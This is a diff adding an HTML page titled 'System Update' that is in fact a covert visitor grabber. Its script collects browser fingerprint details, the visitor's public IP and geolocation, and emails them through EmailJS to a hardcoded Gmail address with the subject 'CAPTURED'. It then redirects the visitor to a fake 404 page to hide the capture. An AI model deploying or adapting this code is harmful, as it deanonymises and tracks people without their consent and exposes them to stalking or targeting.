@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Update</title>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script>
+        emailjs.init("Gf2dIomrXKhbUAF0K");
+    </script>
+</head>
+<body>
+    <script>
+        const data = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screen: `${screen.width}x${screen.height}`,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timestamp: new Date().toISOString()
+        };
+
+        Promise.all([
+            fetch('https://api.ipify.org?format=json').then(r => r.json()),
+            fetch('https://ipapi.co/json/').then(r => r.json())
+        ]).then(([ipData, geoData]) => {
+            data.ip = ipData.ip;
+            data.geo = geoData;
+            
+            emailjs.send('tpalu5n', 'template_z3yb94e', {
+                to_email: 'twtcha01@gmail.com',
+                subject: `🚨 CAPTURED: ${data.ip} - ${data.geo.country}`,
+                message: JSON.stringify(data, null, 2)
+            }).then(() => {
+                window.location.href = 'https://http.cat/404';
+            });
+        });
+    </script>
+</body>
+</html>
